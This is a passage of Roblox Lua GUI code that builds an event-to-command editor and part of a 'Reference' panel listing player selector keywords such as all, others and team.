			{39,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Font=3,Name="Secs",Parent={38},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),Position=UDim2.new(0,60,0,2),Size=UDim2.new(1,-65,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{40,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Label",Parent={39},Position=UDim2.new(0,-55,0,0),Size=UDim2.new(1,0,1,0),Text="Delay (s):",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{41,"Frame",{BackgroundColor3=currentShade1,BorderSizePixel=0,ClipsDescendants=true,Name="EventTemplate",Parent={6},Size=UDim2.new(1,0,0,20),Visible=false,ZIndex=10,}},
			{42,"TextButton",{BackgroundColor3=currentText1,BackgroundTransparency=1,Font=3,Name="Expand",Parent={41},Size=UDim2.new(0,20,0,20),Text=">",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{43,"TextLabel",{BackgroundColor3=currentText1,BackgroundTransparency=1,Font=3,Name="EventName",Parent={41},Position=UDim2.new(0,25,0,0),Size=UDim2.new(1,-25,0,20),Text="OnSpawn",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{44,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BorderSizePixel=0,BackgroundTransparency=1,ClipsDescendants=true,Name="Cmds",Parent={41},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,1,-20),ZIndex=10,}},
			{45,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),Name="Add",Parent={44},Position=UDim2.new(0,0,1,-20),Size=UDim2.new(1,0,0,20),ZIndex=10,}},
			{46,"TextBox",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={45},PlaceholderColor3=Color3.new(0.7843137383461,0.7843137383461,0.7843137383461),PlaceholderText="Add new command",Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-10,1,0),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{47,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={44},Size=UDim2.new(1,0,1,-20),ZIndex=10,}},
			{48,"UIListLayout",{Parent={47},SortOrder=2,}},
			{49,"Frame",{currentShade1,BorderSizePixel=0,ClipsDescendants=true,Name="CmdTemplate",Parent={6},Size=UDim2.new(1,0,0,20),Visible=false,ZIndex=10,}},
			{50,"TextBox",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={49},PlaceholderColor3=Color3.new(1,1,1),Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-45,0,20),Text="a\\b\\c\\d",TextColor3=currentText1,TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{51,"TextButton",{BackgroundColor3=currentShade1,BorderSizePixel=0,Font=3,Name="Delete",Parent={49},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="X",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{52,"TextButton",{BackgroundColor3=currentShade1,BorderSizePixel=0,Font=3,Name="Settings",Parent={49},Position=UDim2.new(1,-40,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{53,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://1204397029",Parent={52},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),ZIndex=10,}},
		})
		main.Name = randomString()
		local mainFrame = main:WaitForChild("Content")
		local eventList = mainFrame:WaitForChild("List")
		local eventListHolder = eventList:WaitForChild("Holder")
		local cmdTemplate = mainFrame:WaitForChild("CmdTemplate")
		local eventTemplate = mainFrame:WaitForChild("EventTemplate")
		local settingsFrame = mainFrame:WaitForChild("Settings"):WaitForChild("Slider")
		local settingsTemplates = mainFrame.Settings:WaitForChild("Templates")
		local settingsList = settingsFrame:WaitForChild("List"):WaitForChild("Holder")
		table.insert(shade2,main.TopBar) table.insert(shade1,mainFrame) table.insert(shade2,eventTemplate)
		table.insert(text1,eventTemplate.EventName) table.insert(shade1,eventTemplate.Cmds.Add) table.insert(shade1,cmdTemplate)
		table.insert(text1,cmdTemplate.TextBox) table.insert(shade2,cmdTemplate.Delete) table.insert(shade2,cmdTemplate.Settings)
		table.insert(scroll,mainFrame.List) table.insert(shade1,settingsFrame) table.insert(shade2,settingsFrame.Line)
		table.insert(shade2,settingsFrame.Close) table.insert(scroll,settingsFrame.List) table.insert(shade2,settingsTemplates.DelayEditor.Secs)
		table.insert(text1,settingsTemplates.DelayEditor.Secs) table.insert(text1,settingsTemplates.DelayEditor.Secs.Label) table.insert(text1,settingsTemplates.Players.Title)
		table.insert(shade3,settingsTemplates.Players.CustomButton) table.insert(shade2,settingsTemplates.Players.Custom) table.insert(text1,settingsTemplates.Players.Custom)
		table.insert(shade3,settingsTemplates.Players.Any.Button) table.insert(shade3,settingsTemplates.Players.Me.Button) table.insert(text1,settingsTemplates.Players.Any)
		table.insert(text1,settingsTemplates.Players.Me) table.insert(text1,settingsTemplates.Strings.Title) table.insert(text1,settingsTemplates.Strings.Any)
		table.insert(shade3,settingsTemplates.Strings.Any.Button) table.insert(shade3,settingsTemplates.Strings.CustomButton) table.insert(text1,settingsTemplates.Strings.Custom)
		table.insert(shade2,settingsTemplates.Strings.Custom)
		table.insert(text1,settingsTemplates.Players.Me) table.insert(text1,settingsTemplates.Numbers.Title) table.insert(text1,settingsTemplates.Numbers.Any)
		table.insert(shade3,settingsTemplates.Numbers.Any.Button) table.insert(shade3,settingsTemplates.Numbers.CustomButton) table.insert(text1,settingsTemplates.Numbers.Custom)
		table.insert(shade2,settingsTemplates.Numbers.Custom)

		local tween = game:GetService("TweenService")
		local tweenInf = TweenInfo.new(0.25,Enum.EasingStyle.Quart,Enum.EasingDirection.Out)

		local currentlyEditingCmd = nil

		settingsFrame:WaitForChild("Close").MouseButton1Click:Connect(function()
			settingsFrame:TweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
		end)

		local function resizeList()
			local size = 0

			for i,v in pairs(eventListHolder:GetChildren()) do
				if v.Name == "EventTemplate" then
					size = size + 20
					if v.Expand.Text == "V" then
						size = size + 20*(1+(#events[v.EventName.Text].commands or 0))
					end
				end
			end

			tween:Create(eventList,tweenInf,{CanvasSize = UDim2.new(0,0,0,size)}):Play()

			if size > eventList.AbsoluteSize.Y then
				eventListHolder.Size = UDim2.new(1,-8,1,0)
			else
				eventListHolder.Size = UDim2.new(1,0,1,0)
			end
		end

		local function resizeSettingsList()
			local size = 0

			for i,v in pairs(settingsList:GetChildren()) do
				if v:IsA("Frame") then
					size = size + v.AbsoluteSize.Y
				end
			end

			settingsList.Parent.CanvasSize = UDim2.new(0,0,0,size)

			if size > settingsList.Parent.AbsoluteSize.Y then
				settingsList.Size = UDim2.new(1,-8,1,0)
			else
				settingsList.Size = UDim2.new(1,0,1,0)
			end
		end

		local function setupCheckbox(button,callback)
			local enabled = button.On.BackgroundTransparency == 0

			local function update()
				button.On.BackgroundTransparency = (enabled and 0 or 1)
			end

			button.On.MouseButton1Click:Connect(function()
				enabled = not enabled
				update()
				if callback then callback(enabled) end
			end)

			return {
				Toggle = function(nocall) enabled = not enabled update() if not nocall and callback then callback(enabled) end end,
				Enable = function(nocall) if enabled then return end enabled = true update()if not nocall and callback then callback(enabled) end end,
				Disable = function(nocall) if not enabled then return end enabled = false update()if not nocall and callback then callback(enabled) end end,
				IsEnabled = function() return enabled end
			}
		end

		local function openSettingsEditor(event,cmd)
			currentlyEditingCmd = cmd

			for i,v in pairs(settingsList:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end

			local delayEditor = settingsTemplates.DelayEditor:Clone()
			delayEditor.Secs.FocusLost:Connect(function()
				cmd[3] = tonumber(delayEditor.Secs.Text) or 0
				delayEditor.Secs.Text = cmd[3]
				if onEdited then onEdited() end
			end)
			delayEditor.Secs.Text = cmd[3]
			delayEditor.Visible = true
			table.insert(shade2,delayEditor.Secs)
			table.insert(text1,delayEditor.Secs)
			table.insert(text1,delayEditor.Secs.Label)
			delayEditor.Parent = settingsList

			for i,v in pairs(event.sets) do
				if v.Type == "Player" then
					local template = settingsTemplates.Players:Clone()
					template.Title.Text = v.Name or "Player"

					local me,any,custom

					me = setupCheckbox(template.Me.Button,function(on)
						if not on then return end
						any.Disable()
						custom.Disable()
						cmd[2][i] = 0
						if onEdited then onEdited() end
					end)

					any = setupCheckbox(template.Any.Button,function(on)
						if not on then return end
						me.Disable()
						custom.Disable()
						cmd[2][i] = 1
						if onEdited then onEdited() end
					end)

					local customTextBox = template.Custom
					custom = setupCheckbox(template.CustomButton,function(on)
						if not on then return end
						me.Disable()
						any.Disable()
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end)

					ViewportTextBox.convert(customTextBox)
					customTextBox.FocusLost:Connect(function()
						if custom:IsEnabled() then
							cmd[2][i] = customTextBox.Text
							if onEdited then onEdited() end
						end
					end)

					local cVal = cmd[2][i]
					if cVal == 0 then
						me:Enable()
					elseif cVal == 1 then
						any:Enable()
					else
						custom:Enable()
						customTextBox.Text = cVal
					end

					template.Visible = true
					table.insert(text1,template.Title)
					table.insert(shade3,template.CustomButton)
					table.insert(shade3,template.Any.Button)
					table.insert(shade3,template.Me.Button)
					table.insert(text1,template.Any)
					table.insert(text1,template.Me)
					template.Parent = settingsList
				elseif v.Type == "String" then
					local template = settingsTemplates.Strings:Clone()
					template.Title.Text = v.Name or "String"

					local any,custom

					any = setupCheckbox(template.Any.Button,function(on)
						if not on then return end
						custom.Disable()
						cmd[2][i] = 0
						if onEdited then onEdited() end
					end)

					local customTextBox = template.Custom
					custom = setupCheckbox(template.CustomButton,function(on)
						if not on then return end
						any.Disable()
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end)

					ViewportTextBox.convert(customTextBox)
					customTextBox.FocusLost:Connect(function()
						if custom:IsEnabled() then
							cmd[2][i] = customTextBox.Text
							if onEdited then onEdited() end
						end
					end)

					local cVal = cmd[2][i]
					if cVal == 0 then
						any:Enable()
					else
						custom:Enable()
						customTextBox.Text = cVal
					end

					template.Visible = true
					table.insert(text1,template.Title)
					table.insert(text1,template.Any)
					table.insert(shade3,template.Any.Button)
					table.insert(shade3,template.CustomButton)
					template.Parent = settingsList
				elseif v.Type == "Number" then
					local template = settingsTemplates.Numbers:Clone()
					template.Title.Text = v.Name or "Number"

					local any,custom

					any = setupCheckbox(template.Any.Button,function(on)
						if not on then return end
						custom.Disable()
						cmd[2][i] = 0
						if onEdited then onEdited() end
					end)

					local customTextBox = template.Custom
					custom = setupCheckbox(template.CustomButton,function(on)
						if not on then return end
						any.Disable()
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end)

					ViewportTextBox.convert(customTextBox)
					customTextBox.FocusLost:Connect(function()
						cmd[2][i] = tonumber(customTextBox.Text) or 0
						customTextBox.Text = cmd[2][i]
						if custom:IsEnabled() then
							if onEdited then onEdited() end
						end
					end)

					local cVal = cmd[2][i]
					if cVal == 0 then
						any:Enable()
					else
						custom:Enable()
						customTextBox.Text = cVal
					end

					template.Visible = true
					table.insert(text1,template.Title)
					table.insert(text1,template.Any)
					table.insert(shade3,template.Any.Button)
					table.insert(shade3,template.CustomButton)
					template.Parent = settingsList
				end
			end
			resizeSettingsList()
			settingsFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
		end

		local function defaultSettings(ev)
			local res = {}

			for i,v in pairs(ev.sets) do
				if v.Type == "Player" then
					res[#res+1] = v.Default or 0
				elseif v.Type == "String" then
					res[#res+1] = v.Default or 0
				elseif v.Type == "Number" then
					res[#res+1] = v.Default or 0
				end
			end

			return res
		end

		local function refreshList()
			for i,v in pairs(eventListHolder:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end

			for name,event in pairs(events) do
				local eventF = eventTemplate:Clone()
				eventF.EventName.Text = name
				eventF.Visible = true
				table.insert(shade2,eventF)
				table.insert(text1,eventF.EventName)
				table.insert(shade1,eventF.Cmds.Add)

				local expanded = false
				eventF.Expand.MouseButton1Down:Connect(function()
					expanded = not expanded
					eventF:TweenSize(UDim2.new(1,0,0,20 + (expanded and 20*#eventF.Cmds.Holder:GetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					eventF.Expand.Text = expanded and "V" or ">"
					resizeList()
				end)

				local function refreshCommands()
					for i,v in pairs(eventF.Cmds.Holder:GetChildren()) do
						if v.Name == "CmdTemplate" then
							v:Destroy()
						end
					end

					for i,cmd in pairs(event.commands) do
						local cmdF = cmdTemplate:Clone()
						local cmdTextBox = cmdF.TextBox
						ViewportTextBox.convert(cmdTextBox)
						cmdTextBox.Text = cmd[1]
						cmdF.Visible = true
						table.insert(shade1,cmdF)
						table.insert(shade2,cmdF.Delete)
						table.insert(shade2,cmdF.Settings)

						cmdTextBox.FocusLost:Connect(function()
							event.commands[i] = {cmdTextBox.Text,cmd[2],cmd[3]}
							if onEdited then onEdited() end
						end)

						cmdF.Settings.MouseButton1Click:Connect(function()
							openSettingsEditor(event,cmd)
						end)

						cmdF.Delete.MouseButton1Click:Connect(function()
							table.remove(event.commands,i)
							refreshCommands()
							resizeList()

							if currentlyEditingCmd == cmd then
								settingsFrame:TweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
							end
							if onEdited then onEdited() end
						end)

						cmdF.Parent = eventF.Cmds.Holder
					end

					eventF:TweenSize(UDim2.new(1,0,0,20 + (expanded and 20*#eventF.Cmds.Holder:GetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
				end

				local newBox = eventF.Cmds.Add.TextBox
				ViewportTextBox.convert(newBox)
				newBox.FocusLost:Connect(function(enter)
					if enter then
						event.commands[#event.commands+1] = {newBox.Text,defaultSettings(event),0}
						newBox.Text = ""

						refreshCommands()
						resizeList()
						if onEdited then onEdited() end
					end
				end)

				--eventF:GetPropertyChangedSignal("AbsoluteSize"):Connect(resizeList)

				eventF.Parent = eventListHolder

				refreshCommands()
			end

			resizeList()
		end

		local function saveData()
			local result = {}
			for i,v in pairs(events) do
				result[i] = v.commands
			end
			return game:GetService("HttpService"):JSONEncode(result)
		end

		local function loadData(str)
			local data = game:GetService("HttpService"):JSONDecode(str)
			for i,v in pairs(data) do
				if events[i] then
					events[i].commands = v
				end
			end
		end

		local function addCmd(event,data)
			table.insert(events[event].commands,data)
		end

		local function setOnEdited(f)
			if type(f) == "function" then
				onEdited = f
			end
		end

		main.TopBar.Close.MouseButton1Click:Connect(function()
			main:TweenPosition(UDim2.new(0.5,-175,0,-500), "InOut", "Quart", 0.5, true, nil)
		end)
		dragGUI(main)
		main.Parent = PARENT

		return {
			RegisterEvent = registerEvent,
			FireEvent = fireEvent,
			Refresh = refreshList,
			SaveData = saveData,
			LoadData = loadData,
			AddCmd = addCmd,
			Frame = main,
			SetOnEdited = setOnEdited
		}
	end)()

	reference = (function()
		local main = create({
			{1,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Name="Main",Position=UDim2.new(0.5,-250,0,-500),Size=UDim2.new(0,500,0,20),ZIndex=10,}},
			{2,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="TopBar",Parent={1},Size=UDim2.new(1,0,0,20),ZIndex=10,}},
			{3,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},Size=UDim2.new(1,0,0.94999998807907,0),Text="Reference",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{4,"TextButton",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Close",Parent={2},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{5,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5054663650",Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
			{6,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderSizePixel=0,Name="Content",Parent={1},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,0,300),ZIndex=10,}},
			{7,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,1295),Name="List",Parent={6},ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,0),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",VerticalScrollBarInset=2,ZIndex=10,}},
			{8,"UIListLayout",{Parent={7},SortOrder=2,}},
			{9,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,411),ZIndex=10,}},
			{10,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={9},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Special Player Cases",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{11,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={9},Position=UDim2.new(0,8,0,25),Size=UDim2.new(1,-8,0,20),Text="These keywords can be used to quickly select groups of players in commands:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{12,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={9},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{13,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Cases",Parent={9},Position=UDim2.new(0,8,0,55),Size=UDim2.new(1,-16,0,342),ZIndex=10,}},
			{14,"UIListLayout",{Parent={13},SortOrder=2,}},
			{15,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{16,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={15},Size=UDim2.new(1,0,1,0),Text="all",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{17,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={15},Position=UDim2.new(0,15,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{18,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{19,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={18},Size=UDim2.new(1,0,1,0),Text="others",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{20,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={18},Position=UDim2.new(0,37,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone except you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{21,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{22,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={21},Size=UDim2.new(1,0,1,0),Text="me",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{23,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={21},Position=UDim2.new(0,19,0,0),Size=UDim2.new(1,0,1,0),Text="- includes your player only",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{24,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{25,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={24},Size=UDim2.new(1,0,1,0),Text="#[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{26,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={24},Position=UDim2.new(0,59,0,0),Size=UDim2.new(1,0,1,0),Text="- gets a specified amount of random players",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{27,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{28,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={27},Size=UDim2.new(1,0,1,0),Text="random",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{29,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={27},Position=UDim2.new(0,44,0,0),Size=UDim2.new(1,0,1,0),Text="- affects a random player",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{30,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{31,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={30},Size=UDim2.new(1,0,1,0),Text="%[team name]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{32,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={30},Position=UDim2.new(0,78,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone on a given team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{33,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{34,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={33},Size=UDim2.new(1,0,1,0),Text="allies / team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{35,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={33},Position=UDim2.new(0,63,0,0),Size=UDim2.new(1,0,1,0),Text="- players who are on your team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{36,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{37,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={36},Size=UDim2.new(1,0,1,0),Text="enemies / nonteam",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{38,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={36},Position=UDim2.new(0,101,0,0),Size=UDim2.new(1,0,1,0),Text="- players who are not on your team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{39,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{40,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={39},Size=UDim2.new(1,0,1,0),Text="friends",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{41,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={39},Position=UDim2.new(0,40,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone who is friends with you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{42,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{43,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={42},Size=UDim2.new(1,0,1,0),Text="nonfriends",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{44,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={42},Position=UDim2.new(0,61,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone who is not friends with you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{45,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{46,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={45},Size=UDim2.new(1,0,1,0),Text="guests",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{47,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={45},Position=UDim2.new(0,36,0,0),Size=UDim2.new(1,0,1,0),Text="- guest players (obsolete)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{48,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{49,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={48},Size=UDim2.new(1,0,1,0),Text="bacons",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
